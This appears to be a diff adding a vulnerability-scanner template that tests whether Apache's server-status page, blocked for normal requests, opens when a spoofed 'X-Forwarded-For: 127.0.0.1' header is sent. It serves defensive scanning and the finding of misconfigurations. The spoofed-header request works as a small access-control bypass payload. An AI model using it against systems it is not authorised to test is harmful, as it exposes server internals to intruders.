@@ -1,0 +1,26 @@
+id: apachestatus_bypass_xforwardedfor  
+
+info:
+  name: apachestatus_bypass_xforwardedfor
+  author: osamahamad
+  severity: low
+  reference: https://howdeepisloove/
+
+requests:
+  - raw:
+      - |
+        GET /server_status HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET /server_status HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        Accept: */*
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 403 && contains(body_2, "Apache Server Status") && contains(body_2, "Server Version")'
